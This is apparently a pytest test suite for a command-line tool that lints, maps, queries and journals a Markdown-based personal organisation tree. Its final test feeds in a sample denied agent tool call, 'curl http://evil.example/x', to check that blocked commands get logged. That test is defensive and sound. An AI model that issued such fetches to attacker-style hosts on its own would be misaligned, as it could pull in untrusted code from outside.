import datetime as dt
import shutil
import subprocess
from pathlib import Path

import pytest

from life import mapgen
from life.cli import main
from life.lint import lint
from life.query import Filter, format_json, format_table, query

FIXTURE = Path(__file__).resolve().parent.parent / "fixture"
TODAY = dt.date(2026, 9, 8)


@pytest.fixture
def tree(tmp_path: Path) -> Path:
    root = tmp_path / "tree"
    shutil.copytree(FIXTURE, root)
    return root


def messages(problems) -> list[str]:
    return [str(p) for p in problems]


def test_fixture_is_clean(tree: Path):
    assert lint(tree, TODAY) == []


def test_missing_frontmatter_field(tree: Path):
    path = tree / "projects" / "deck-replacement.md"
    path.write_text(path.read_text().replace("domain: personal\n", ""))
    found = messages(lint(tree, TODAY))
    assert any("domain must be one of" in m for m in found)


def test_focus_needs_next(tree: Path):
    path = tree / "projects" / "deck-replacement.md"
    path.write_text(path.read_text().replace("next: Get two more quotes by Friday\n", ""))
    assert any("next is required" in m for m in messages(lint(tree, TODAY)))


def test_related_must_be_symmetric(tree: Path):
    path = tree / "areas" / "house.md"
    path.write_text(path.read_text().replace("related: [deck-replacement]\n", ""))
    found = messages(lint(tree, TODAY))
    assert any("areas/house.md: must list 'deck-replacement'" in m for m in found)


def test_related_must_exist(tree: Path):
    path = tree / "projects" / "write-a-novel.md"
    path.write_text(path.read_text().replace("tier: someday\n", "tier: someday\nrelated: [garage-shelves]\n"))
    found = messages(lint(tree, TODAY))
    assert any("related 'garage-shelves' is not an open file" in m for m in found)


def test_kind_must_match_directory(tree: Path):
    src = tree / "tasks" / "renew-passport.md"
    (tree / "projects" / "renew-passport.md").write_text(src.read_text())
    found = messages(lint(tree, TODAY))
    assert any("kind is 'task' but the directory says 'project'" in m for m in found)
    assert any("slug 'renew-passport' is used by" in m for m in found)


def test_size_limit(tree: Path):
    path = tree / "projects" / "write-a-novel.md"
    path.write_text(path.read_text() + "\n".join(["filler"] * 120))
    assert any("lines, limit 120" in m for m in messages(lint(tree, TODAY)))
    (tree / "MAP.md").write_text("\n".join(["x"] * 151))
    assert any("MAP.md: 151 lines, limit 150" in m for m in messages(lint(tree, TODAY)))


def test_journal_names_and_dates(tree: Path):
    (tree / "journal" / "notes.md").write_text("stray")
    (tree / "journal" / "2026" / "12-25.md").write_text("# future")
    found = messages(lint(tree, TODAY))
    assert any("journal/notes.md: journal files are named" in m for m in found)
    assert any("12-25.md: journal entry is dated in the future" in m for m in found)


def test_person_cannot_carry_status(tree: Path):
    path = tree / "people" / "priya-patel.md"
    path.write_text(path.read_text().replace("domain: work\n", "domain: work\nstatus: active\n"))
    assert any("status does not apply to a person" in m for m in messages(lint(tree, TODAY)))


def test_past_journal_is_immutable(tree: Path):
    subprocess.run(["git", "init", "-q"], cwd=tree, check=True)
    subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", "add", "."], cwd=tree, check=True)
    subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "seed"], cwd=tree, check=True)
    assert lint(tree, TODAY) == []
    (tree / "journal" / "2026" / "09-07.md").write_text("# 2026-09-07\n\n- 09:00 rewritten\n")
    (tree / "journal" / "2026" / "09-08.md").write_text("# 2026-09-08\n\n- 09:00 today, still open\n")
    (tree / "archive" / "projects" / "garage-shelves.md").write_text("changed")
    found = messages(lint(tree, TODAY))
    assert "journal/2026/09-07.md: past journal entries are never edited" in found
    assert "archive/projects/garage-shelves.md: archived files are never edited" in found
    assert not any("09-08" in m for m in found)


def test_map_contents(tree: Path):
    text = mapgen.build_map(tree, TODAY)
    assert "- **Replace the deck** (`deck-replacement`): Get two more quotes by Friday" in text
    assert "(`billing-migration`, waiting)" in text
    assert "(`deck-quotes`, task, in deck-replacement)" in text
    assert "(`learn-woodworking`, project, background, review 2026-09-01)" in text
    assert "- 2026-09-01 **Renew passport** (`renew-passport`, overdue)" in text
    assert "- `contractor-jim`, `deck-replacement`, `house`" in text
    assert "Projects: 2 focus, 1 background, 1 someday. Areas: 2. Open tasks: 3. People: 2." in text
    assert "old-website" not in text
    assert "write-a-novel" not in text


def test_map_writes_file_and_is_stable(tree: Path):
    mapgen.write_map(tree, TODAY)
    first = (tree / "MAP.md").read_text()
    mapgen.write_map(tree, TODAY)
    assert (tree / "MAP.md").read_text() == first
    assert lint(tree, TODAY) == []


def test_query_filters(tree: Path):
    slugs = lambda hits: [e.slug for e in hits]
    assert slugs(query(tree, Filter(tier="focus"), TODAY)) == [
        "acme-account", "deck-replacement", "billing-migration", "deck-quotes",
    ]
    assert slugs(query(tree, Filter(kind="project"), TODAY)) == [
        "learn-woodworking", "deck-replacement", "write-a-novel", "billing-migration",
    ]
    assert slugs(query(tree, Filter(kind="project", include_done=True), TODAY)) == [
        "learn-woodworking", "deck-replacement", "write-a-novel", "billing-migration", "old-website",
    ]
    assert slugs(query(tree, Filter(due_before=TODAY), TODAY)) == ["renew-passport"]
    assert slugs(query(tree, Filter(review_due=True), TODAY)) == ["learn-woodworking"]
    assert slugs(query(tree, Filter(parent="deck-replacement"), TODAY)) == ["deck-quotes"]
    assert slugs(query(tree, Filter(related="deck-replacement"), TODAY)) == ["house", "contractor-jim"]
    assert slugs(query(tree, Filter(status="done"), TODAY)) == ["old-website"]


def test_cli_lint_and_query(tree: Path, capsys):
    assert main(["--root", str(tree), "--today", "2026-09-08", "lint"]) == 0
    assert capsys.readouterr().out.strip() == "ok"
    assert main(["--root", str(tree), "--today", "2026-09-08", "query", "--kind", "task", "--format", "paths"]) == 0
    out = capsys.readouterr().out.split()
    assert out == ["tasks/deck-quotes.md", "tasks/renew-passport.md", "tasks/expense-report.md"]
    (tree / "projects" / "broken.md").write_text("no frontmatter\n")
    assert main(["--root", str(tree), "--today", "2026-09-08", "lint"]) == 1
    assert "projects/broken.md: missing frontmatter" in capsys.readouterr().out


def edit(tree: Path, rel: str, old: str, new: str) -> None:
    path = tree / rel
    text = path.read_text()
    assert old in text, (rel, old)
    path.write_text(text.replace(old, new))


def run_all(tree: Path) -> list[str]:
    """Run every command, then return the lint messages. A command that raises fails the test."""
    mapgen.build_map(tree, TODAY)
    for fmt in ("table", "json", "paths"):
        main(["--root", str(tree), "--today", "2026-09-08", "query", "--format", fmt])
    return messages(lint(tree, TODAY))


@pytest.mark.parametrize(
    "rel, old, new, expected",
    [
        ("projects/deck-replacement.md", "touched: 2026-09-05", "touched: 2026-13-45", "month must be in 1..12"),
        ("tasks/deck-quotes.md", "parent: deck-replacement", "parent: [deck-replacement]", "parent must be a string"),
        ("projects/deck-replacement.md", "kind: project\n", "kind: project\n2026: x\n", "unknown frontmatter keys: 2026"),
        ("projects/deck-replacement.md", "domain: personal", "domain: 5", "domain must be one of"),
        ("projects/deck-replacement.md", "tier: focus", "tier: 5", "tier must be one of"),
        ("projects/deck-replacement.md", "status: active", "status: 5", "status must be one of"),
        ("projects/write-a-novel.md", "tier: someday\n", "tier: someday\nrelated: [2026-09-08]\n", "related must be a list of slugs"),
        ("projects/write-a-novel.md", "title: Write a novel", "title:", "title is required"),
        ("projects/write-a-novel.md", "touched: 2026-07-01\n", "", "touched is required"),
        ("projects/write-a-novel.md", "touched: 2026-07-01", "touched: 2026-09-09", "touched is in the future"),
        ("projects/write-a-novel.md", "tier: someday\n", "tier: someday\ndue: 2026-10-01\n", "due applies only to tasks"),
        ("tasks/renew-passport.md", "tier: background\n", "tier: background\nparent: renew-passport\n", "parent 'renew-passport' must be a project or an area"),
        ("tasks/renew-passport.md", "tier: background\n", "tier: background\nparent: nobody\n", "parent 'nobody' is not an open file"),
        ("tasks/renew-passport.md", "tier: background\n", "tier: background\nparent: old-website\n", "parent 'old-website' is not an open file"),
        ("areas/house.md", "related: [deck-replacement]", "related: [deck-replacement, deck-replacement]", "related has duplicate entries"),
        ("areas/house.md", "related: [deck-replacement]", "related: [house]", "related lists itself"),
        ("projects/old-website.md", "tier: background\n", "tier: background\nrelated: [house]\n", "a done file must have an empty related list"),
        ("projects/write-a-novel.md", "## Goal", "## Notes\n\nfirst\n\n## Goal", "heading 'Goal' must come before 'Notes'"),
        ("projects/write-a-novel.md", "## Goal", "## Background", "heading 'Background' is not one of"),
        ("projects/write-a-novel.md", "## Goal", "### Goal", "heading 'Goal' must be level two"),
        ("projects/write-a-novel.md", "---\n\n## Goal", "---\n## Goal\n\n## Goal", "heading 'Goal' appears twice"),
        ("people/priya-patel.md", "domain: work\n", "domain: work\ntier: focus\n", "tier does not apply to a person"),
        ("cursors/runs.json", "{", "{{", "not valid JSON"),
        ("cursors/runs.json", '"last_run": "2026-09-08T07:00:00-06:00"', '"last_run": "yesterday"', "last_run must be an ISO 8601 timestamp"),
    ],
)
def test_lint_reports_instead_of_crashing(tree: Path, rel, old, new, expected):
    edit(tree, rel, old, new)
    found = run_all(tree)
    assert any(expected in m for m in found), found


def test_unreadable_entries_are_problems(tree: Path):
    (tree / "projects" / "latin.md").write_bytes(b"---\ntitle: caf\xe9\n---\n")
    (tree / "projects" / "ghost.md").symlink_to(tree / "projects" / "missing.md")
    (tree / "projects" / "weird.md").mkdir()
    (tree / "projects" / "notes.txt").write_text("x")
    found = run_all(tree)
    assert any("projects/latin.md: cannot read" in m for m in found)
    assert "projects/ghost.md: projects/ holds only <slug>.md files" in found
    assert "projects/weird.md: projects/ holds only <slug>.md files" in found
    assert "projects/notes.txt: projects/ holds only <slug>.md files" in found


def test_related_to_done_file_is_rejected(tree: Path):
    edit(tree, "areas/house.md", "related: [deck-replacement]", "related: [deck-replacement, old-website]")
    assert any("areas/house.md: related 'old-website' is not an open file" in m for m in messages(lint(tree, TODAY)))


def test_frontmatter_edge_cases(tree: Path):
    path = tree / "projects" / "write-a-novel.md"
    text = path.read_text()
    head = text[: text.index("\n---\n") + 4]
    path.write_text(head)
    assert not any("write-a-novel" in m for m in messages(lint(tree, TODAY)))
    path.write_text("---\n---\nbody\n")
    found = messages(lint(tree, TODAY))
    assert any("write-a-novel.md: title is required" in m for m in found)
    assert not any("unterminated" in m for m in found)


def test_archive_is_checked(tree: Path):
    (tree / "archive" / "projects" / "house.md").write_text((tree / "areas" / "house.md").read_text().replace("kind: area", "kind: project"))
    (tree / "archive" / "people").mkdir()
    (tree / "archive" / "people" / "someone.md").write_text("---\nkind: person\ntitle: Someone\ndomain: work\ntouched: 2026-01-01\n---\n")
    found = messages(lint(tree, TODAY))
    assert "archive/projects/house.md: slug 'house' is also active at areas/house.md" in found
    assert "archive/projects/house.md: archived files must have status done" in found
    assert "archive/projects/house.md: archived files must have an empty related list" in found
    assert not any("someone" in m for m in found)


def test_layout_and_cursor_presence(tree: Path):
    (tree / "stray.md").write_text("x")
    (tree / "unknown").mkdir()
    (tree / "cursors" / "note.txt").write_text("x")
    (tree / "journal" / "2026" / "09-01.md").write_text("\n".join(["x"] * 121))
    found = messages(lint(tree, TODAY))
    assert "stray.md: stray file at the root" in found
    assert "unknown: directory is not part of the tree layout" in found
    assert "cursors/note.txt: cursors/ holds only .json files" in found
    assert "journal/2026/09-01.md: 121 lines, limit 120" in found
    (tree / "cursors" / "runs.json").unlink()
    assert any("cursors/runs.json: missing" in m for m in messages(lint(tree, TODAY)))


def git(cwd: Path, *args: str) -> None:
    subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *args], cwd=cwd, check=True, capture_output=True)


def test_immutability_in_a_subdirectory(tmp_path: Path):
    repo = tmp_path / "repo"
    root = repo / "sub dir" / "tree"
    shutil.copytree(FIXTURE, root)
    git(repo, "init", "-q")
    git(repo, "add", ".")
    git(repo, "commit", "-qm", "seed")
    (root / "journal" / "2026" / "09-07.md").write_text("# 2026-09-07\n\n- 09:00 rewritten\n")
    (root / "archive" / "projects" / "garage-shelves.md").write_text("changed")
    (root / "journal" / "2026" / "09-06.md").write_text("# 2026-09-06\n\n- 09:00 new, staged, then changed\n")
    git(repo, "add", "sub dir/tree/journal/2026/09-06.md")
    (root / "journal" / "2026" / "09-06.md").write_text("# 2026-09-06\n\n- 09:00 changed again\n")
    found = messages(lint(root, TODAY))
    assert "journal/2026/09-07.md: past journal entries are never edited" in found
    assert "archive/projects/garage-shelves.md: archived files are never edited" in found
    assert not any("09-06" in m for m in found)


def test_map_review_includes_focus_and_people(tree: Path):
    edit(tree, "projects/deck-replacement.md", "review: 2026-09-12", "review: 2026-09-01")
    edit(tree, "people/priya-patel.md", "domain: work\n", "domain: work\nreview: 2026-09-08\n")
    edit(tree, "areas/acme-account.md", "touched: 2026-09-07", "touched: 2026-08-01")
    mapgen.write_map(tree, TODAY)
    assert lint(tree, TODAY) == []
    text = mapgen.build_map(tree, TODAY)
    assert "(`deck-replacement`, project, focus, review 2026-09-01)" in text
    assert "(`priya-patel`, person, review 2026-09-08)" in text
    assert "(`acme-account`, area, stale since 2026-08-01)" in text


def test_map_must_be_current(tree: Path):
    edit(tree, "projects/write-a-novel.md", "tier: someday", "tier: focus\nnext: Write a page")
    assert "MAP.md: out of date; run `life map`" in messages(lint(tree, TODAY))
    mapgen.write_map(tree, TODAY)
    assert lint(tree, TODAY) == []


def test_required_root_files(tree: Path):
    (tree / "GUIDE.md").unlink()
    (tree / "LOCAL.md").write_text("---\nowner: X\ntimezone: Mars/Olympus\nsms: 5551234\nextra: 1\n---\n")
    found = messages(lint(tree, TODAY))
    assert "GUIDE.md: missing; every tree has GUIDE.md, LOCAL.md, and MAP.md" in found
    assert "LOCAL.md: timezone 'Mars/Olympus' is not a known zone" in found
    assert any("LOCAL.md: sms must be a quoted E.164" in m for m in found)
    assert "LOCAL.md: unknown frontmatter keys: extra" in found


def test_focus_waiting_needs_next(tree: Path):
    edit(tree, "projects/billing-migration.md", "next: Waiting on the provider's sandbox credentials, chase on Wednesday\n", "")
    assert any("billing-migration.md: next is required for an open focus item" in m for m in messages(lint(tree, TODAY)))


def test_special_files_do_not_hang(tree: Path):
    import os
    os.mkfifo(tree / "projects" / "pipe.md")
    (tree / "projects" / "zero.md").symlink_to("/dev/zero")
    found = run_all(tree)
    assert "projects/pipe.md: projects/ holds only <slug>.md files" in found
    assert "projects/zero.md: projects/ holds only <slug>.md files" in found


def test_rename_of_past_journal_day_is_caught(tmp_path: Path):
    root = tmp_path / "tree"
    shutil.copytree(FIXTURE, root)
    (root / "journal" / "2026" / "09-08.md").unlink()
    git(root, "init", "-q")
    git(root, "add", ".")
    git(root, "commit", "-qm", "seed")
    git(root, "mv", "journal/2026/09-07.md", "journal/2026/09-08.md")
    assert "journal/2026/09-07.md: past journal entries are never edited" in messages(lint(root, TODAY))


def test_json_output_survives_odd_yaml(tree: Path):
    edit(tree, "projects/write-a-novel.md", "tier: someday\n", "tier: someday\nsource: {2026-09-08: x}\nrelated: &a [*a]\n")
    hits = query(tree, Filter(kind="project"), TODAY)
    import json
    records = json.loads(format_json(hits, tree))
    novel = next(r for r in records if r["slug"] == "write-a-novel")
    assert novel["source"] == {"2026-09-08": "x"}
    assert isinstance(novel["related"], list)


def test_query_output_formats(tree: Path):
    hits = query(tree, Filter(kind="task"), TODAY)
    table = format_table(hits).splitlines()
    assert table[0].split() == ["slug", "kind", "domain", "tier", "status", "due", "review", "title"]
    assert table[1].split()[:6] == ["deck-quotes", "task", "personal", "focus", "active", "2026-09-12"]
    assert table[1].endswith("Call two more deck contractors")
    assert len(table) == 4
    import json
    records = json.loads(format_json(hits, tree))
    assert [r["slug"] for r in records] == ["deck-quotes", "renew-passport", "expense-report"]
    assert records[0]["due"] == "2026-09-12" and records[0]["path"] == "tasks/deck-quotes.md"


def test_map_sections_respect_dates(tree: Path):
    late = dt.date(2026, 8, 20)
    text = mapgen.build_map(tree, late)
    assert "Nothing is due for review." in text
    assert "No tasks are due." in text
    assert "Nothing outside focus is blocked or waiting." not in text
    text = mapgen.build_map(tree, dt.date(2026, 9, 5))
    assert "- 2026-09-12 **Call two more deck contractors**" in text
    assert "- 2026-09-30" not in text
    assert "People: 2." in text
    (tree / "people" / "ana.md").write_text("---\nkind: person\ntitle: Ana\ndomain: work\ntouched: 2026-09-01\n---\n")
    assert "People: 3." in mapgen.build_map(tree, TODAY)
    assert "## Tasks" in mapgen.build_map(tree, dt.date(9999, 12, 30))


@pytest.mark.parametrize(
    "rel, old, new, expected",
    [
        ("projects/write-a-novel.md", "tier: someday\n", "tier: someday\nparent: house\n", "parent applies only to tasks"),
        ("projects/write-a-novel.md", "tier: someday\n", "tier: someday\nsource: [x]\n", "source must be a string"),
        ("cursors/runs.json", "{", "[{", "must be a JSON object"),
    ],
)
def test_more_lint_messages(tree: Path, rel, old, new, expected):
    path = tree / rel
    text = path.read_text()
    if rel.endswith(".json"):
        path.write_text("[]")
    else:
        path.write_text(text.replace(old, new))
    assert any(expected in m for m in messages(lint(tree, TODAY)))


def test_layout_details(tree: Path):
    (tree / "journal" / "2026" / "02-30.md").write_text("# 2026-02-30\n")
    (tree / "archive" / "stray.md").write_text("x")
    (tree / "archive" / "other").mkdir()
    (tree / "projects" / "Bad Name.md").write_text((tree / "projects" / "write-a-novel.md").read_text())
    (tree / "GUIDE.md").write_text("\n".join(["x"] * 151))
    (tree / "random.txt").write_text("x")
    found = messages(lint(tree, TODAY))
    assert "journal/2026/02-30.md: journal file name is not a real date" in found
    assert "archive/stray.md: archive holds only archive/<projects|areas|tasks|people>/" in found
    assert "archive/other: archive holds only archive/<projects|areas|tasks|people>/" in found
    assert any("Bad Name.md: slug 'Bad Name' must be lowercase" in m for m in found)
    assert "GUIDE.md: 151 lines, limit 150" in found
    assert "random.txt: stray file at the root" in found


def test_headings_skip_code_fences(tree: Path):
    edit(tree, "projects/write-a-novel.md", "## Goal", "## Goal\n\n```sh\n# a shell comment\n```\n")
    mapgen.write_map(tree, TODAY)
    assert lint(tree, TODAY) == []


def test_journal_command(tree: Path, capsys):
    now = "2026-09-09T07:05:00+00:00"
    assert main(["--root", str(tree), "journal", "--now", now, "first  entry about `deck-replacement`"]) == 0
    path = tree / "journal" / "2026" / "09-09.md"
    assert path.read_text() == "# 2026-09-09\n\n- 01:05 first entry about `deck-replacement`\n"
    assert main(["--root", str(tree), "journal", "--now", "2026-09-09T02:00:00-06:00", "second"]) == 0
    assert path.read_text().endswith("- 02:00 second\n")
    assert lint(tree, dt.date(2026, 9, 9)) == [] or all("MAP.md" in str(p) for p in lint(tree, dt.date(2026, 9, 9)))
    assert main(["--root", str(tree), "journal"]) == 2


def test_journal_denied_hook(tree: Path, monkeypatch):
    import io
    payload = '{"tool_name": "Bash", "tool_input": {"command": "curl http://evil.example/x"}, "reason": "blocked by classifier"}'
    monkeypatch.setattr("sys.stdin", io.StringIO(payload))
    assert main(["--root", str(tree), "journal", "--denied", "--now", "2026-09-08T12:00:00-06:00"]) == 0
    text = (tree / "journal" / "2026" / "09-08.md").read_text()
    assert text.endswith('- 12:00 denied: Bash {"command": "curl http://evil.example/x"} because blocked by classifier\n')
    monkeypatch.setattr("sys.stdin", io.StringIO("not json"))
    assert main(["--root", str(tree), "journal", "--denied", "--now", "2026-09-08T12:01:00-06:00"]) == 0
    assert "- 12:01 denied: unknown tool null" in (tree / "journal" / "2026" / "09-08.md").read_text()
